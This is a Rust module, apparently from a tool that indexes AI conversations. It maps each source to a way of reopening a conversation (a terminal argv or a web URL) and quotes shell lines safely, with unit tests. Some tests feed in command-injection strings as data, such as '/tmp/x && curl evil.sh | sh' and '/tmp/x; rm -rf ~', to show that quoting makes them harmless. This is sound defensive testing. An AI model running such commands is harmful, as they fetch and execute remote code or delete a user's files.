//! Where a conversation can be reopened, resolved from the source that produced it.
//!
//! This replaces `conversation.resume_cmd`: one string, `format!`ed inside each importer and
//! frozen into a column. Two things were wrong with that. A string holds exactly one way to
//! reopen something, while the stated need is terminal *and* web *and* editor. And it was never
//! a property of the conversation — it is a property of `(source, native_id)` evaluated *now*,
//! so the day a CLI changed its resume syntax every row in the index was wrong until the next
//! rebuild.
//!
//! Both columns this reads are permanent (ADR 2, ADR 16), so resolving late costs nothing and a
//! syntax change takes effect with no reindex.
//!
//! Spec: docs/TUI-DESIGN.md §6. That sketch takes a `&Conversation`; this takes the id pair
//! instead, because the callers that need a destination hold a search result, not a parsed
//! conversation — and the pair is the part ADR 2 makes stable anyway.

use serde::Serialize;

/// One way to reopen a conversation.
///
/// The payload differs by variant rather than being a string every caller re-sniffs: a URL is
/// not a command, and the `if cmd.starts_with("http://")` guess that used to stand in for this
/// distinction is what the type exists to delete.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Destination {
    /// An argv, already split, to run in the conversation's directory when it has one.
    ///
    /// Split here rather than at the call site because here is the only place that knows where
    /// the boundaries are. A pre-rendered string forces the launcher to split on whitespace and
    /// hope, which is the guess this replaces.
    Terminal { argv: Vec<String> },
    /// A URL for the platform opener.
    Web { url: String },
}

impl Destination {
    /// Label for the picker in docs/TUI-DESIGN.md §6. Not derived from the variant name, so the
    /// wording stays a UI decision rather than a consequence of an identifier.
    pub fn label(&self) -> &'static str {
        match self {
            Destination::Terminal { .. } => "Terminal",
            Destination::Web { .. } => "Web",
        }
    }

    /// The argv to spawn, with no shell in between.
    ///
    /// A URL is not a program name, so it becomes an argument to the platform opener rather
    /// than something `exec` would look for on `PATH` and never find — which is how the
    /// majority of this corpus would otherwise fail to open at all.
    pub fn argv(&self) -> Vec<String> {
        match self {
            Destination::Terminal { argv } => argv.clone(),
            Destination::Web { url } => {
                let opener = if cfg!(target_os = "macos") { "open" } else { "xdg-open" };
                vec![opener.to_string(), url.clone()]
            }
        }
    }

    /// A shell line that reopens this, first `cd`-ing when a directory is given.
    ///
    /// Composed here, once, because it is written to be `eval`ed and the quoting rule has to
    /// live in exactly one place — `cs pick`, the TUI's print path and `scripts/cs-fzf` each
    /// built their own version of this line, and a rule spread across three renderers is the
    /// shape the local-date bug already took.
    pub fn shell_line(&self, cwd: Option<&str>) -> String {
        let cmd = self.argv().iter().map(|a| quoted(a)).collect::<Vec<_>>().join(" ");
        match cwd.filter(|d| !d.is_empty()) {
            Some(dir) => format!("cd {} && {cmd}", quoted(dir)),
            None => cmd,
        }
    }
}

/// One shell word, quoted when quoting changes what it means.
///
/// The condition is a total rule rather than a look at today's data: every character in the
/// inert set is meaningless to a POSIX shell in argument position, so for those the bare and
/// quoted forms are provably the same word. Everything else — whitespace, globs, `$`, `&`,
/// `#`, `~`, a quote, a newline, the empty string — is quoted.
///
/// The alternative, quoting unconditionally, is equally safe and was tried first. It renders
/// the common line as `'claude' '--resume' '<id>'`, and this string's other job is to be read.
fn quoted(value: &str) -> String {
    let inert = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-' | ':' | ',' | '@' | '+');
    if !value.is_empty() && value.chars().all(inert) {
        return value.to_string();
    }
    shell_quote(value)
}

/// POSIX single-quote wrapping.
///
/// Single quotes suspend every shell expansion, so the only character needing care is `'`
/// itself: close the quote, emit an escaped one, reopen.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Every way to reopen `native_id`, best first.
///
/// Order is the table's, and it is what a client opens when it does not ask — §6's "skip the
/// modal when there is one answer" reads `len() == 1`, and its sticky default reads the front.
///
/// Empty means the source has no reopen path at all: `gemini-cli` writes no resumable session,
/// and a `claude-desktop` conversation lives inside an app that takes no argument. That is a
/// fact to report, not a failure — a client must be able to tell "this cannot be reopened from
/// here" from "something broke", and an empty list says the first without an error.
///
/// An unknown source returns empty rather than guessing, because a wrong command is worse than
/// no command: it runs.
pub fn destinations(source: &str, native_id: &str) -> Vec<Destination> {
    match source {
        "codex" => vec![Destination::Terminal {
            argv: vec!["codex".into(), "resume".into(), native_id.into()],
        }],
        "claude-code" => vec![Destination::Terminal {
            argv: vec!["claude".into(), "--resume".into(), native_id.into()],
        }],
        // The export's ids are the ids the web app routes on, which is the only reason this
        // works — nothing here is reconstructed from the export's contents.
        "chatgpt-export" => vec![Destination::Web {
            url: format!("https://chatgpt.com/c/{native_id}"),
        }],
        _ => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_agent_session_reopens_as_an_argv_with_no_shell_in_between() {
        assert_eq!(
            destinations("codex", "019f-main"),
            [Destination::Terminal {
                argv: vec!["codex".into(), "resume".into(), "019f-main".into()],
            }]
        );
        assert_eq!(
            destinations("claude-code", "s-1"),
            [Destination::Terminal {
                argv: vec!["claude".into(), "--resume".into(), "s-1".into()],
            }]
        );
    }

    #[test]
    fn a_server_side_conversation_reopens_as_a_url_rather_than_a_command() {
        assert_eq!(
            destinations("chatgpt-export", "conv-1"),
            [Destination::Web { url: "https://chatgpt.com/c/conv-1".into() }]
        );
    }

    #[test]
    fn a_source_with_no_reopen_path_says_so_by_returning_nothing() {
        // An unknown source differs from these only in intent; both mean "nothing to offer" and
        // a client renders the same message. What matters is that neither invents a command.
        assert!(destinations("gemini-cli", "abc").is_empty());
        assert!(destinations("claude-desktop", "abc").is_empty());
        assert!(destinations("some-tool-adopted-tomorrow", "abc").is_empty());
    }

    #[test]
    fn an_id_needing_quoting_stays_exactly_one_argument() {
        // The reason argv survives instead of a command line: nothing downstream re-parses it,
        // so an id carrying a space or a quote cannot split into two arguments or become a
        // syntax error in someone's shell.
        let [Destination::Terminal { argv }] = &destinations("codex", "a b'c")[..] else {
            panic!("codex resumes in a terminal");
        };
        assert_eq!(argv[2], "a b'c", "the id is one argument, verbatim");
    }

    #[test]
    fn a_url_becomes_an_argument_to_the_opener_rather_than_a_program() {
        let argv = destinations("chatgpt-export", "conv-1")[0].argv();
        assert_eq!(argv.len(), 2, "opener plus the url, and no shell in between");
        assert!(matches!(argv[0].as_str(), "open" | "xdg-open"));
        assert_eq!(argv[1], "https://chatgpt.com/c/conv-1");
    }

    #[test]
    fn an_ordinary_line_is_readable_and_a_hostile_one_is_quoted() {
        let d = Destination::Terminal { argv: vec!["claude".into(), "--resume".into(), "s-1".into()] };
        assert_eq!(d.shell_line(None), "claude --resume s-1");
        assert_eq!(
            d.shell_line(Some("/Users/me/My Project")),
            "cd '/Users/me/My Project' && claude --resume s-1"
        );
    }

    #[test]
    fn every_character_that_means_something_to_a_shell_forces_quoting() {
        // Spelled out rather than trusted to the allowlist's complement, because the failure
        // mode is silent: one inert-looking character admitted by mistake turns a directory
        // name into an instruction.
        for hostile in ["a b", "a$b", "a&b", "a;b", "a|b", "a>b", "a<b", "a*b", "a?b", "a[b",
                        "a#b", "~/x", "a`b", "a'b", "a\"b", "a\nb", "a(b", "a{b", "a!b", ""] {
            let d = Destination::Terminal { argv: vec![hostile.into()] };
            assert!(
                d.shell_line(None).starts_with('\''),
                "{hostile:?} reached the line unquoted"
            );
        }
    }

    #[test]
    fn a_url_carrying_shell_metacharacters_cannot_background_the_line() {
        // The old pre-rendered string was printed bare, so an `&` in a query string ended the
        // command early and ran the rest in the background. Quoting removes the whole class.
        let d = Destination::Web { url: "https://x.test/c/a?b=1&c=2".into() };
        let line = d.shell_line(None);
        assert!(line.ends_with("'https://x.test/c/a?b=1&c=2'"), "got {line}");
    }

    #[test]
    fn a_directory_with_a_quote_in_it_does_not_escape_its_quoting() {
        let d = Destination::Terminal { argv: vec!["codex".into()] };
        assert_eq!(d.shell_line(Some("/tmp/o'brien")), r"cd '/tmp/o'\''brien' && codex");
    }

    #[test]
    fn shell_metacharacters_lose_their_meaning() {
        for hostile in [
            "/tmp/x; rm -rf ~",
            "/tmp/x && curl evil.sh | sh",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nrm -rf ~",
        ] {
            let quoted = shell_quote(hostile);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
            // Nothing between the quotes can close them, which is what makes the whole value
            // one word to the shell however it is spelled.
            assert!(!quoted[1..quoted.len() - 1].contains('\''));
        }
    }

    #[test]
    fn an_embedded_quote_is_escaped_rather_than_dropped() {
        // The one case single-quoting cannot handle by itself, and the one most likely to be
        // got wrong: `it's` must round-trip, not silently lose a character.
        assert_eq!(shell_quote("/tmp/it's here"), r"'/tmp/it'\''s here'");
    }

    #[test]
    fn an_empty_directory_string_is_not_a_directory() {
        // `cwd` arrives as Option<String> from a column that is empty for some rows; `cd ''`
        // would be a cd to nowhere rather than a no-op.
        let d = Destination::Terminal { argv: vec!["codex".into()] };
        assert_eq!(d.shell_line(Some("")), "codex");
    }

    #[test]
    fn a_destination_serialises_as_data_to_pick_from_rather_than_a_string_to_parse() {
        // ADR 12: `cs search --json` is the contract every client consumes, so the variants have
        // to arrive as structure. A GUI offering "open in browser" must not be grepping for
        // `https://`.
        let json = serde_json::to_value(&destinations("chatgpt-export", "c1")[0]).unwrap();
        assert_eq!(json["kind"], "web");
        assert_eq!(json["url"], "https://chatgpt.com/c/c1");

        let json = serde_json::to_value(&destinations("codex", "c1")[0]).unwrap();
        assert_eq!(json["kind"], "terminal");
        assert_eq!(json["argv"][0], "codex");
    }
}
